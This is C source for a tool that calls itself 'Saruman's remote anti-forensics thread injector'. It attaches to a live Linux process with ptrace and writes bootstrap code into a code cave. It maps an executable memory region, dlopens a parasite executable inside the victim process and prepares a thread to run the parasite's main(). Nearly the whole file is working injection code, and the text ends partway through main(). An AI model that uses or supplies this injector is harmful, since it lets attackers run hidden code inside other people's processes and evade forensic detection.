/*
 * Saruman Version 2.0
 * elfmaster [at] arcana-research.io
 */

#include <sys/user.h>
#include <sys/ptrace.h>
#include <ctype.h>
#include <sys/wait.h>

#include "saruman_v2.h"

#define SIGCHLD		17
#define CLONE_VM	0x00000100	/* set if VM shared between processes */
#define CLONE_FS	0x00000200	/* set if fs info shared between processes */
#define CLONE_FILES	0x00000400	/* set if open files shared between processes */
#define CLONE_SIGHAND	0x00000800	/* set if signal handlers shared */

#define __NR_clone 56
#define __NR_exit 60

#define __PAYLOAD_ATTRIBUTES__	 __attribute__((aligned(8),__always_inline__))
#define __PAYLOAD_KEYWORDS__ __PAYLOAD_ATTRIBUTES__ static inline volatile

#define PT_CALL_REGION_SIZE 40960
#define PT_CALL_REGION 0x000B0000

#define STACK_SIZE PAGE_SIZE * 4096

#define LIBC_PATH "/lib/x86_64-linux-gnu/libc.so.6"

typedef struct saruman_ctx {
	elfobj_t *elfobj;
	struct user_regs_struct pt_regs;
	struct user_regs_struct o_pt_regs;
	pid_t pid;
	char *exec_path;
	uint64_t base_vaddr; // base address of executable at load-time
	uint64_t libc_base_vaddr; // base address of libc at load-time
	uint8_t *orig_code_cave; //backup of code in r-xp region of main executable
	uint64_t orig_code_cave_addr;
	size_t cave_len;
	struct {
		elfobj_t *elfobj;
	} libc;
	struct {
		uint8_t *base;
		uint64_t rsp, rbp;
		size_t len;
	} stack;
	struct {
		char **argv;
		int argc;
	} args;
	struct {
#define	PT_ATTACHED	(1UL << 0)
#define PT_DETACHED	(1UL << 1)
		pid_t pid;
		uint64_t flags;
	} task;
	struct {
		/*
		 * Points to first r-xp region, not necessarily
		 * the base of the program image which is read-only
		 * on modern ELF
		 */
		uint64_t executable_base_addr;
		size_t executable_len;
	} bootstrap;
	struct {
#define MAX_ARGV_LEN 12
		uint64_t base_vaddr;
		uint64_t entry_point;
		char *main_argv[MAX_ARGV_LEN];
		int main_argc;
	} parasite;
	bool bootstrap_phase_complete;
} saruman_ctx_t;

typedef struct saruman_rpc {
	void * (*fn)(void);
	size_t fn_len;
	char **args;
	int argc;
	uint64_t retval;
	struct user_regs_struct o_pt_regs;
	struct user_regs_struct n_pt_regs;
} saruman_rpc_t;

#if defined DEBUG
	#define saruman_debug(...) {\
	do {\
		fprintf(stderr, "[%s:%s:%d] ", __FILE__, __func__, __LINE__); \
		fprintf(stderr, __VA_ARGS__);	\
	} while(0); \
}
#else
	#define saruman_debug(...)
#endif

#pragma GCC push_options
#pragma GCC optimize ("O0")

/*
 * A version of load_elf_binary() that works with PIE executables
 * only.
 */
#define __RTLD_DLOPEN 0x80000000 //glibc internal dlopen flag emulates dlopen behaviour



__PAYLOAD_KEYWORDS__ void * dlopen_loader(const char *path, uint64_t dlopen_addr)
{
	void * (*libc_dlopen)(const char *, int) = (void *)((uint64_t)dlopen_addr);
	void *handle = (void *)0xfff; //initialized for debugging
	handle = libc_dlopen(path, RTLD_NOW|RTLD_GLOBAL);
	__RETURN_VALUE__(handle);
	__BREAKPOINT__;
}

/*
 * Used for debugging when dlopen fails
 */
__PAYLOAD_KEYWORDS__ void * dlerror2(uint64_t dlerror_addr)
{
	void * (*libc_dlerror)(void) = (void *)((uint64_t)dlerror_addr);
       char *str = libc_dlerror();
	__RETURN_VALUE__(str);
	__BREAKPOINT__;
}

/*
 * A simplified load_elf_binary() function that loads the
 * position independent parasite executable into the remote
 * process address space (But would work with non PIE too)
 */
__PAYLOAD_KEYWORDS__ int evil_read(long fd, char *buf, unsigned long len)
{
	 long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
			"mov $0, %%rax\n"
			"syscall" : : "g"(fd), "g"(buf), "g"(len));
	asm("mov %%rax, %0" : "=r"(ret));
	return (int)ret;
}


__PAYLOAD_KEYWORDS__ void * evil_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
{
	long mmap_fd = fd;
	unsigned long mmap_off = off;
	unsigned long mmap_flags = flags;
	unsigned long ret;

	__asm__ volatile(
			 "mov %0, %%rdi\n"
			 "mov %1, %%rsi\n"
			 "mov %2, %%rdx\n"
			 "mov %3, %%r10\n"
			 "mov %4, %%r8\n"
			 "mov %5, %%r9\n"
			 "mov $9, %%rax\n"
			 "syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
	asm ("mov %%rax, %0" : "=r"(ret));
	return (void *)ret;
}

__PAYLOAD_KEYWORDS__ int create_thread(void (*fn)(void *), void *data,
    unsigned long stack, int main_argc, char **main_argv)
{
	long retval;
	void **newstack = (void **)stack;

	*--newstack = data;
	newstack = (void **)((unsigned long)newstack & ~0xfUL);

	__asm__ __volatile__(
		"xor %%rdx, %%rdx\n\t"
		"xor %%r10, %%r10\n\t"
		"xor %%r8,  %%r8\n\t"
		"syscall\n\t"
		"test %%rax, %%rax\n\t"
		"jne 1f\n\t"
		"mov %[argc], %%rdi\n\t"
		"mov %[argv], %%rsi\n\t"
		"xor %%rdx, %%rdx\n\t"
		"call *%[fn]\n\t"

		"xor %%rdi, %%rdi\n\t"
		"mov %[exitnr], %%eax\n\t"
		"syscall\n"
		"1:\n"
		: "=a"(retval)
		: "0"((long)__NR_clone),
		  "D"((long)(CLONE_VM | CLONE_FS | CLONE_FILES |
			     CLONE_SIGHAND | CLONE_THREAD | CLONE_SYSVSEM )), /*SIGCHLD)), */
		  "S"(newstack),
		  [fn] "r"(fn),
		  [argc] "r"((long)main_argc),
		  [argv] "r"(main_argv),
		  [exitnr] "i"(__NR_exit)
		: "rcx", "r11", "rdx", "r10", "r8", "memory"
	);

	if (retval < 0) {
		retval = -1;
		__RETURN_VALUE__(retval);
	}
	__BREAKPOINT__;
	return (int)retval;
}

__PAYLOAD_KEYWORDS__ uint64_t bootstrap_code(void * vaddr, uint64_t size, void *stack)
{
	volatile void *mem;

	 /*
	 * Create executable segment for ephemeral storage
	 * of code for custom procedure calls done through
	 * ptrace. These include syscalls (Such as SYS_mprotect)
	 * and other simple functions that we want to execute
	 * within the remote process.
	 */
	mem = evil_mmap((void *)PT_CALL_REGION,
			PT_CALL_REGION_SIZE,
			PROT_READ|PROT_WRITE|PROT_EXEC,
			MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,
			-1, 0);
	if (mem == MAP_FAILED) {
		__RETURN_VALUE__(-1);
		__BREAKPOINT__;
	}

	/*
	 * Create stack segment that will be used by the parasite
	 * thread.
	 */
	mem = evil_mmap(stack,
			STACK_SIZE,
			PROT_READ|PROT_WRITE,
			MAP_ANONYMOUS|MAP_PRIVATE|MAP_GROWSDOWN,
			-1, 0);
	if (mem == MAP_FAILED) {
		__RETURN_VALUE__(-1);
		__BREAKPOINT__;
	}

	__RETURN_VALUE__(mem);
	__BREAKPOINT__;
}


#pragma GCC pop_options
/*
 * This wrapper to waitpid() will restart waitpid
 * if it is interrupted by a signal.
 */

bool saruman_ptrace_write(struct saruman_ctx *ctx,
    void *dest, const void *src, size_t len)
{
	pid_t pid = ctx->task.pid;
	size_t rem = len % sizeof(void *);
	size_t quot = len / sizeof(void *);
	unsigned char *s = (unsigned char *) src;
	unsigned char *d = (unsigned char *) dest;

	while (quot-- != 0) {
		saruman_debug("poking to %p\n", d);
		if ( ptrace(PTRACE_POKEDATA, pid, d, *(void **)s) == -1 )
			goto out_error;
		s += sizeof(void *);
		d += sizeof(void *);
	}

	if (rem != 0) {
		long w;
		unsigned char *wp = (unsigned char *)&w;

		w = ptrace(PTRACE_PEEKDATA, pid, d, NULL);
		if (w == -1 && errno != 0) {
			d -= sizeof(void *) - rem;

			w = ptrace(PTRACE_PEEKDATA, pid, d, NULL);
			if (w == -1 && errno != 0)
				goto out_error;

			wp += sizeof(void *) - rem;
		}

		while (rem-- != 0)
			wp[rem] = s[rem];

		if (ptrace(PTRACE_POKEDATA, pid, (void *)d, (void *)w) == -1)
			goto out_error;
	}

	return true;

out_error:
	fprintf(stderr, "saruman_ptrace_write() failed, pid: %d: %s\n", pid, strerror(errno));
	return false;
}

bool saruman_ptrace_read(struct saruman_ctx *ctx,
    void *dst, const void *src, size_t len)
{
	int sz = len / sizeof(void *);
	unsigned char *s = (unsigned char *)src;
	unsigned char *d = (unsigned char *)dst;
	long word;
	pid_t pid = ctx->task.pid;

	while (sz-- != 0) {
		saruman_debug("Reading from %p\n", src);
		word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
		if (word == -1 && errno) {
			fprintf(stderr, "saruman_ptrace_read() failed, pid: %d: %s\n", pid, strerror(errno));
			return false;
		}
		*(long *)d = word;
		s += sizeof(long);
		d += sizeof(long);
	}

	return true;
}

static int
waitpid2(pid_t pid, int *status, int options)
{
	pid_t ret;

	do {
		ret = waitpid(pid, status, options);
	} while (ret == -1 && errno == EINTR);

	return ret;
}

bool
saruman_ptrace_detach(saruman_ctx_t *ctx)
{
	pid_t pid = ctx->task.pid;

	if (ctx->task.flags & PT_DETACHED)
		return true;

	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
		if (errno) {
			fprintf(stderr,
			    "PTRACE_DETACH failed: %s\n", strerror(errno));
			return false;
		}
	}
	ctx->task.flags |= PT_DETACHED;
	saruman_debug("[+] PT_TID_DETACHED -> %d\n", pid);
	return true;
}

bool
saruman_ptrace_attach(struct saruman_ctx *ctx)
{
	int status;

	if (ctx->task.flags & PT_ATTACHED)
		return true;

	if (ptrace(PTRACE_ATTACH, ctx->task.pid, NULL, NULL) < 0) {
		if (errno) {
			fprintf(stderr, "PTRACE_ATTACH failed: %s\n", strerror(errno));
			return false;
		}
	}
	do {
		/*
		 * Wait for the child to STOP
		 */
		if (waitpid2(ctx->task.pid, &status, 0) < 0)
			goto detach;

		/*
		 * Has the process actually stopped?
		 * If not goto detach
		 */
		if (!WIFSTOPPED(status))
			goto detach;

		/*
		 * Check the signal, is it actually SIGSTOP from us?
		 */
		if (WSTOPSIG(status) == SIGSTOP)
			break;

		/*
		 * If it wasn't our signal, but something else (i.e. SIGTRAP, SIGINT, etc.)
		 * then resume the process with the original signal. We re-inject the signal
		 * with WSTOPSIG(status)
		 */
		if (ptrace(PTRACE_CONT, ctx->task.pid, 0, WSTOPSIG(status)) == -1 )
			goto detach;
	} while(1);

	ctx->task.flags |= PT_ATTACHED;
	saruman_debug("[+] PT_TID_ATTACHED -> %d\n", ctx->task.pid);
	return true;


detach:
	/*
	 * Something went wrong
	 */
	fprintf(stderr, "Failed... detaching\n");
	saruman_ptrace_detach(ctx);
	return false;
}

/*
 * We use a code-cave to store the initial boot code. We must backup the original
 * code.
 */
bool saruman_backup_cave(struct saruman_ctx *ctx, uint64_t cave_addr,
    size_t cave_len)
{
	ctx->orig_code_cave = malloc(cave_len);

	if (ctx->orig_code_cave == NULL) {
		perror("malloc");
		return false;
	}

	ctx->cave_len = cave_len;
	ctx->orig_code_cave_addr = cave_addr;
	if (saruman_ptrace_read(ctx, ctx->orig_code_cave, (void *)cave_addr, cave_len) == false) {
		fprintf(stderr, "saruman_ptrace_read() failed on %#lx\n", cave_addr);
		return false;
	}

	return true;
}

bool saruman_restore_cave(struct saruman_ctx *ctx)
{		
	if (saruman_ptrace_write(ctx, (void *)ctx->orig_code_cave_addr,
	    ctx->orig_code_cave, ctx->cave_len) == false) {
		fprintf(stderr, "saruman_ptrace_write() failed on %#lx\n", ctx->orig_code_cave_addr);
		return false;
	}	
	return true;	
}

bool saruman_find_bootloader_cave(struct saruman_ctx *ctx)
{
	FILE *fp;
	char path[4096], buf[4096];
	char *p;

	snprintf(path, 4096, "/proc/%d/maps", ctx->task.pid);
	fp = fopen(path, "r");
	if (fp == NULL) {
		perror("fopen");
		return false;
	}
	/*
	 * Find the first instance of r-xp region of the main
	 * executable. While we're at it find the first r--p region
	 * with a '/' in the line-- that's our base address.
	 */
	while (fgets(buf, sizeof(buf), fp) != NULL) {
		if (ctx->base_vaddr == 0 && strstr(buf, "r--p") != NULL &&
		    strchr(buf, '/') != NULL) {
			p = strchr(buf, '-');
			*p = '\0';
			ctx->base_vaddr = strtoul(buf, NULL, 16);
			saruman_debug("ctx->base_vaddr: %#lx\n", ctx->base_vaddr);
			continue;
		}
		if (strstr(buf, "r-xp") == NULL)
			continue;
		if (strchr(buf, '/') == NULL)
			continue;
		p = strchr(buf, '-');
		*p = '\0';
		ctx->bootstrap.executable_base_addr =
		    strtoul(buf, NULL, 16);
		ctx->bootstrap.executable_len =
		    strtoul((p + 1), NULL, 16) - ctx->bootstrap.executable_base_addr;
		fclose(fp);
		return true;
	}
	
	fclose(fp);
	return false;
}

bool saruman_find_libc_base(struct saruman_ctx *ctx)
{
	FILE *fp;
	char path[4096], buf[4096];
	char *p;

	snprintf(path, 4096, "/proc/%d/maps", ctx->task.pid);
	fp = fopen(path, "r");
	if (fp == NULL) {
		perror("fopen");
		return false;
	}

	while (fgets(buf, sizeof(buf), fp) != NULL) {
		if (ctx->libc_base_vaddr == 0 &&
		    strstr(buf, "/lib/x86_64-linux-gnu/libc.so.6") != NULL) {
			if (strstr(buf, "r--p") == NULL)
				continue;
			p = strchr(buf, '-');
			*p = '\0';
			ctx->libc_base_vaddr = strtoul(buf, NULL, 16);
			fclose(fp);
			return true;
		}
	}
	fclose(fp);
	return false;
}

bool saruman_store_register_state(struct saruman_ctx *ctx)
{
	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &ctx->o_pt_regs) < 0) {
		perror("PTRACE_GETREGS");
		return false;
	}

	memcpy((void *)&ctx->pt_regs,
	    (void *)&ctx->o_pt_regs,
	    sizeof(struct user_regs_struct));
	return true;
}

bool saruman_restore_register_state(struct saruman_ctx *ctx)
{
	if (ptrace(PTRACE_SETREGS, ctx->task.pid, NULL, &ctx->o_pt_regs) < 0) {
		perror("PTRACE_SETREGS");
		return false;
	}
	return true;
}

void saruman_remote_call_init(struct saruman_rpc *rpc, void *fn, size_t fn_len,
    char **args, int argc) 
{
	rpc->fn = (void *)fn;
	rpc->fn_len = fn_len;
	rpc->args = args;
	rpc->argc = argc;
	return;
}

bool saruman_remote_call(struct saruman_ctx *ctx, struct saruman_rpc *rpc)
{
	bool res;
	uint64_t addr, exec_rsp;
	int status;
	struct user_regs_struct *pt_regs;

	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &rpc->o_pt_regs) < 0) {
		perror("ptrace");
		return false;
	}

	memcpy(&rpc->n_pt_regs, &rpc->o_pt_regs, sizeof(struct user_regs_struct));

	addr = ctx->bootstrap_phase_complete ?
	    PT_CALL_REGION : ctx->bootstrap.executable_base_addr;

	saruman_debug("Writing %zu bytes from %p to %#lx\n", rpc->fn_len, rpc->fn, addr);
	
	if (ctx->bootstrap_phase_complete == false) {
		res = saruman_backup_cave(ctx, addr, rpc->fn_len);
		if (res == false) {
			fprintf(stderr, "saruman_backup_cave() failed\n");
			return false;
		}
	}
	res = saruman_ptrace_write(ctx, (void *)addr, rpc->fn, rpc->fn_len);
	if (res == false) {
		fprintf(stderr, "saruman_ptrace_write() failed on pid %d\n", ctx->task.pid);
		return false;
	}

	saruman_debug("Setting pt_regs.rip to %#lx\n", addr);

	pt_regs = &rpc->n_pt_regs;
	pt_regs->rip = addr;
	if ((long)pt_regs->orig_rax >= 0) {
		pt_regs->orig_rax = -1;
	}
	if (ctx->bootstrap_phase_complete == true) {
		if ((ctx->stack.rsp % 16) != 8) {
			saruman_debug("Re-aligning stack to 8 bit align\n");
			ctx->stack.rsp -= 8;
		}
		pt_regs->rsp = ctx->stack.rsp; //SySv wants rsp % 16 == 8
		saruman_debug("pt_regs->rsp is set to %#llx\n", pt_regs->rsp);
	}

	saruman_debug("rdi: %p rsi %p rdx %p rcx %p r8 %p\n",
			rpc->args[0],rpc->args[1],rpc->args[2],rpc->args[3],rpc->args[4]);
	switch(rpc->argc) {
	case 1:
		pt_regs->rdi = (uintptr_t)rpc->args[0];
		break;
	case 2:
		pt_regs->rdi = (uintptr_t)rpc->args[0];
		pt_regs->rsi = (uintptr_t)rpc->args[1];
		break;
	case 3:
		pt_regs->rdi = (uintptr_t)rpc->args[0];
		pt_regs->rsi = (uintptr_t)rpc->args[1];
		pt_regs->rdx = (uintptr_t)rpc->args[2];
		break;
	case 4:
		pt_regs->rdi = (uintptr_t)rpc->args[0];
		pt_regs->rsi = (uintptr_t)rpc->args[1];
		pt_regs->rdx = (uintptr_t)rpc->args[2];
		pt_regs->rcx = (uintptr_t)rpc->args[3];
		break;
	case 5:
		pt_regs->rdi = (uintptr_t)rpc->args[0];
		pt_regs->rsi = (uintptr_t)rpc->args[1];
		pt_regs->rdx = (uintptr_t)rpc->args[2];
		pt_regs->rcx = (uintptr_t)rpc->args[3];
		pt_regs->r8 =  (uintptr_t)rpc->args[4];
		break;
	case 6:
		pt_regs->rdi = (uintptr_t)rpc->args[0];
		pt_regs->rsi = (uintptr_t)rpc->args[1];
		pt_regs->rdx = (uintptr_t)rpc->args[2];
		pt_regs->rcx = (uintptr_t)rpc->args[3];
		pt_regs->r8 =  (uintptr_t)rpc->args[4];
		pt_regs->r9 =  (uintptr_t)rpc->args[5];
		break;
	}

	/*
	 * Set the new register state
	 * */
	if (ptrace(PTRACE_SETREGS, ctx->task.pid, NULL, &rpc->n_pt_regs) < 0) {
		perror("ptrace setregs");
		return false;
	}
	if (ptrace(PTRACE_CONT, ctx->task.pid, NULL, NULL) < 0) {
		perror("ptrace cont");
		return false;
	}
	waitpid2(ctx->task.pid, &status, 0);

	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &rpc->n_pt_regs) < 0) {
		perror("ptrace setregs");
		return false;
	}
	saruman_debug("rip is set to: %#llx\n", rpc->n_pt_regs.rip);

	if (WSTOPSIG(status) != SIGTRAP) {
		fprintf(stderr,
		    "[!] No SIGTRAP received, something went wrong. Signal: %d\n",
		    WSTOPSIG(status));
		return false;
	}
	/* Get return value */
	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &rpc->n_pt_regs) < 0) {
		perror("PTRACE_GETREGS");
		return false;
	}
	rpc->retval = pt_regs->rax;
	/*
	 * Restore the old register state back.
	 */
	if (ptrace(PTRACE_SETREGS, ctx->task.pid, NULL, &rpc->o_pt_regs) < 0) {
		perror("ptrace setregs");
		return false;
	}
	return true;
}

uint64_t saruman_push_string(struct saruman_ctx *ctx, char *string)
{
	size_t len = strlen(string) + 1;
	size_t i;
	bool res;

	len = (len + 15) & ~15;

	uint8_t *ptr = (uint8_t *)ctx->stack.rsp - len;

	saruman_debug("Calling ptrace_write(), writing string '%s' to %p\n", string, ptr);

	res = saruman_ptrace_write(ctx, ptr, string, len);
	if (res == false) {
		fprintf(stderr, "saruman_ptrace_write() failed on %d\n", ctx->task.pid);
		exit(EXIT_FAILURE);
	}
	ctx->stack.rsp -= len;
	return ctx->stack.rsp;
}

/*
 * Call function: bootstrap_code(PT_CALL_REGION, PT_CALL_REGION_SIZE, NULL);
 * remotely in the target process.
 */
bool saruman_run_bootstrap(struct saruman_ctx *ctx, uint64_t *retval)
{
	struct saruman_rpc rpc;

	saruman_debug("Writing %i bytes of bootstrap code into %p\n",
	     1024, (void *)ctx->bootstrap.executable_base_addr);

	char *argv[] = {(void *)PT_CALL_REGION, (void *)PT_CALL_REGION_SIZE, (void *)0x0};
	saruman_remote_call_init(&rpc, &bootstrap_code, 1024, argv, 3);
	if (saruman_remote_call(ctx, &rpc) == false) {
		fprintf(stderr, "saruman_remote_call() failed on: run_bootstrap()\n");
		return false;
	}
	ctx->bootstrap_phase_complete = true;
	*retval = rpc.retval;
	return true;
}

bool saruman_find_libc_dlopen(struct saruman_ctx *ctx, uint64_t *value)
{
	elf_error_t elf_error;
	struct elf_symbol symbol;

	if (ctx->libc.elfobj == NULL) {
		ctx->libc.elfobj = malloc(sizeof(elfobj_t));
		if (ctx->libc.elfobj == NULL) {
			perror("malloc");
			return false;
		}
		if (elf_open_object(LIBC_PATH, ctx->libc.elfobj,
		    ELF_LOAD_F_STRICT, &elf_error) == false) {
			fprintf(stderr, "elf_open_object() failed on %s: %s\n",
			    LIBC_PATH, elf_error_msg(&elf_error));
			return false;
		}
	}
	if (elf_symbol_by_name(ctx->libc.elfobj, "dlopen", &symbol) == false) {
		fprintf(stderr, "elf_symbol_by_name() failed on: \"dlopen\"\n");
		return false;
	}
	symbol.value += ctx->libc_base_vaddr;
	memcpy(value, &symbol.value, sizeof(uint64_t));
	return true;
}

bool saruman_find_libc_dlerror(struct saruman_ctx *ctx, uint64_t *value)
{
	elf_error_t elf_error;
	struct elf_symbol symbol;

	if (ctx->libc.elfobj == NULL) {
		ctx->libc.elfobj = malloc(sizeof(elfobj_t));
		if (ctx->libc.elfobj == NULL) {
			perror("malloc");
			return false;
		}
		if (elf_open_object(LIBC_PATH, ctx->libc.elfobj,
		    ELF_LOAD_F_STRICT, &elf_error) == false) {
			fprintf(stderr, "elf_open_object() failed on %s: %s\n",
			    LIBC_PATH, elf_error_msg(&elf_error));
			return false;
		}
	}
	if (elf_symbol_by_name(ctx->libc.elfobj, "dlerror", &symbol) == false) {
		fprintf(stderr, "elf_symbol_by_name() failed on: \"dlerror\"\n");
		return false;
	}
	symbol.value += ctx->libc_base_vaddr;
	memcpy(value, &symbol.value, sizeof(uint64_t));
}

/*
 * This function removes the PIE flag from DT_FLAGS_1
 * in the dynamic segment, otherwise dlopen() won't
 * load the executable.
 */
bool saruman_remove_pie_flag(struct saruman_ctx *ctx)
{
	elf_dynamic_entry_t d_entry;
	elf_dynamic_iterator_t d_iter;
	elf_error_t error;
	bool res;

	if (ctx->elfobj == NULL) {
		ctx->elfobj = malloc(sizeof(elfobj_t));
		if (ctx->elfobj == NULL) {
			perror("malloc");
			return false;
		}
		if (elf_open_object(ctx->exec_path, ctx->elfobj,
		    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error) == false) {
			fprintf(stderr, "elf_open_object() failed on %s: %s\n",
			    ctx->exec_path, elf_error_msg(&error));
			return false;
		}
	}

	elf_dynamic_iterator_init(ctx->elfobj, &d_iter);
	for (;;) {
		res = elf_dynamic_iterator_next(&d_iter, &d_entry);
		if (res == ELF_ITER_DONE)
			break;
		if (res == ELF_ITER_ERROR) {
			fprintf(stderr, "elf_dynamic_iterator_next failed\n");
			return false;
		}
		if (d_entry.tag == DT_FLAGS_1) {
			uint64_t tval = d_entry.value & ~(uint64_t)DF_1_PIE;
			if (elf_dynamic_set_value(&d_iter, tval) == false) {
				fprintf(stderr, "Failed to remove DF_1_PIE flag from binary\n");
				return false;
			}
			return true;
		}
	}
	return true;
}

bool saruman_find_injected_base(struct saruman_ctx *ctx)
{
	FILE *fp;
	char path[4096], buf[4096];
	char *p, *name, *newline;

	name = strrchr(ctx->exec_path, '/');
	if (name != NULL)
		name += 1;

	snprintf(path, 4096, "/proc/%d/maps", ctx->task.pid);
	fp = fopen(path, "r");
	if (fp == NULL) {
		perror("fopen");
		return false;
	}
		
	while (fgets(buf, sizeof(buf), fp) != NULL) {
		p = strrchr(buf, '/');
		if (p == NULL)
			continue;
		newline = strchr(p + 1, '\n');
		*newline = '\0';
		if (strcmp((p + 1), name) == 0) {
			p = strchr(buf, '-');
			*p = '\0';
			ctx->parasite.base_vaddr = strtoul(buf, NULL, 16);
			fclose(fp);
			return true;
		}
	}
	fclose(fp);
	return false;
}

int main(int argc, char **argv)
{
	char **main_argv;
	struct saruman_ctx saruman;
	struct saruman_rpc rpc;
	uint64_t retval, dlopen_addr, dlerror_addr;
	struct elf_symbol symbol;
	bool res;
	int i, main_argc;

	memset(&saruman, 0, sizeof(saruman));

	if (argc < 2) {
		printf("---------------[Saruman V2.0]--------------\n");
		printf("Saruman's remote anti-forensics thread injector\n");
		printf("Usage: %s <pid> <exec_path> <exec_args>\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	for (i = 0; i < strlen(argv[1]); i++) {
		if (!isdigit(argv[1][i])) {
			fprintf(stderr, "Arg1 is should be a numerical PID\n");
			exit(EXIT_FAILURE);
		}
	}
	saruman.task.pid = atoi(argv[1]);
	saruman.exec_path = strdup(argv[2]);
	if (saruman.exec_path == NULL) {
		perror("strdup");
		exit(EXIT_FAILURE);
	}
	
	if (saruman_remove_pie_flag(&saruman) == false) {
		fprintf(stderr, "failed to remove DT_FLAG_1 PIE flag\n");
		exit(EXIT_FAILURE);
	}

	fprintf(stdout, "Attaching to PID: %d\n", saruman.task.pid);
	fprintf(stdout, "Injecting: %s\n", saruman.exec_path);

	saruman.args.argv = &argv[2];
	argc = argc - 1;

	saruman_debug("PTRACE ATTACH\n");
	if (saruman_ptrace_attach(&saruman) == false) {
		fprintf(stderr, "saruman_ptrace_attach() failedon pid: %d\n",
		    saruman.task.pid);
		exit(EXIT_FAILURE);
	}

	saruman_debug("STORE REGISTER STATE\n");
	if (saruman_store_register_state(&saruman) == false) {
		fprintf(stderr, "saruman_store_register_state() failedon pid: %d\n",
		    saruman.task.pid);
		exit(EXIT_FAILURE);
	}

	if (saruman_find_libc_base(&saruman) == false) {
		fprintf(stderr, "Failed to find libc.so.6 base address in memory\n");
		exit(EXIT_FAILURE);
	}

	printf("Finding bootloader cave\n");

	if (saruman_find_bootloader_cave(&saruman) == false) {
		fprintf(stderr, "saruman_find_bootloader_cave() failed on pid: %d\n",
		    saruman.task.pid);
		exit(EXIT_FAILURE);
	}
	printf("Bootstrap executable region: %#lx - %#lx\n",
	    saruman.bootstrap.executable_base_addr,
	    saruman.bootstrap.executable_base_addr + saruman.bootstrap.executable_len);

	if (saruman_run_bootstrap(&saruman, &retval) == false) {
		fprintf(stderr, "saruman_run_bootstrap() failed\n");
		exit(EXIT_FAILURE);
	}
	saruman.stack.len = STACK_SIZE;
	saruman.stack.base = (void *)retval;
	saruman.stack.rsp = ((uint64_t)retval + saruman.stack.len);

	printf("bootstrap complete, stack base: %p\n", saruman.stack.base);
	printf("rsp initialized to %#lx\n", saruman.stack.rsp);
	/*
	 * Call dlopen_loader(exec_path, exec_args, parasite_argc)
	 */

	res = saruman_find_libc_dlopen(&saruman, &dlopen_addr);
	if (res == false) {
		fprintf(stderr, "Failed to find dlopen()\n");
		exit(EXIT_FAILURE);
	}

	printf("Calling dlopen_loader remotely, dlopen() is at %p\n", (void *)dlopen_addr);
	/*
	 * Push the pathname string onto the remote process stack that we initialized
	 * in the bootstrap code. This is necessary for injected code to access
	 * memory.
	 */
	char *exec_path = (char *)saruman_push_string(&saruman, argv[2]);

	/*
	 * Setup RPC args to call dlopen_loader(path, dlopen_vaddr);
	 */
	char *dlopen_loader_args[] = {exec_path, (char *)dlopen_addr};
	saruman_remote_call_init(&rpc, &dlopen_loader, 1024,
	    dlopen_loader_args, 2);
	saruman_remote_call(&saruman, &rpc);
	
	saruman_debug("dlopen handle: %p\n", (void *)rpc.retval);

	if ((void *)rpc.retval == NULL) {
		res = saruman_find_libc_dlerror(&saruman, &dlerror_addr);

		saruman_debug("Calling a remote dlerror()\n");
		char *dlerror_loader_args[] = {(char *)dlerror_addr};
		saruman_remote_call_init(&rpc, &dlerror2, 1024, dlerror_loader_args, 1);
		saruman_remote_call(&saruman, &rpc);

		saruman_debug("Reading from rpc.retval: %p\n", (void *)rpc.retval);
		char tmp[32];

		if (saruman_ptrace_read(&saruman, tmp, (void *)rpc.retval, 32) == false) {
			fprintf(stderr, "saruman_ptrace_read() failed\n");
			exit(EXIT_FAILURE);
		}
		if (rpc.retval != 0)
			saruman_debug("dlerror msg: %s\n", tmp);
		exit(EXIT_FAILURE);
	}

	printf("Successfully injected executable '%s' into memory\n", argv[2]);

	if (saruman_find_injected_base(&saruman) == false) {
		fprintf(stderr, "Failed to find base address of injected: %s\n", argv[2]);
		exit(EXIT_FAILURE);
	}

	if (elf_symbol_by_name(saruman.elfobj, "main", &symbol) == false) {
		fprintf(stderr, "elf_symbol_by_name() failed on main\n");
		exit(EXIT_FAILURE);
	}
	saruman_debug("The symbol main: %#lx\n", symbol.value);
	saruman.parasite.entry_point = saruman.parasite.base_vaddr + symbol.value;
	printf("Entry point of parasite main(): %#lx\n", saruman.parasite.entry_point);

	/*
	 * A remote call to creat_thread() will begin execution at main() but we need to have
	 * the char **argv ascii data stored into remote stack memory before-hand.
	 */
	for (i = 0; i < argc - 1; i++) {
		if (i >= MAX_ARGV_LEN) {
			fprintf(stderr, "Too many argv entries to main()\n");
			exit(EXIT_FAILURE);
		}
		saruman_debug("Pushing: %s\n", argv[i + 2]);
		saruman.parasite.main_argv[i] =
		    (char *)saruman_push_string(&saruman, argv[i + 2]);
		saruman_debug("saruman.parasite.main_argv[%d] = %p\n",
		    i, saruman.parasite.main_argv[i]);
	}
	saruman.parasite.main_argc = argc - 1;

	/*
	 * Copy char **argv array of pointers to remote stack
	 * so that the remote main() can be called.
	 */
	size_t nptr = (size_t)(saruman.parasite.main_argc + 1) * 8;
	uint64_t remote_argv, z = 0;

	saruman.stack.rsp &= ~0xfUL;
	saruman.stack.rsp -= nptr;
	remote_argv = saruman.stack.rsp;

	/*
	 * Write argv[0 ... N] to remote stack.
	 */
	for (i = 0; i < saruman.parasite.main_argc; i++) {
		uint64_t p = (uint64_t)saruman.parasite.main_argv[i];

		if (!saruman_ptrace_write(&saruman,
		    (void *)(remote_argv + (uint64_t)i * 8),
		    &p, sizeof(p))) {
			fprintf(stderr, "failed to write argv[%d]\n", i);
			exit(EXIT_FAILURE);
		}
	}
	/*
	 * Write terminating NULL to and of argv array
	 * */
	if (!saruman_ptrace_write(&saruman,
	    (void *)(remote_argv +
		(uint64_t)saruman.parasite.main_argc * 8),
	    &z, sizeof(z))) {
		fprintf(stderr, "failed to write argv NULL\n");
		exit(EXIT_FAILURE);
	}

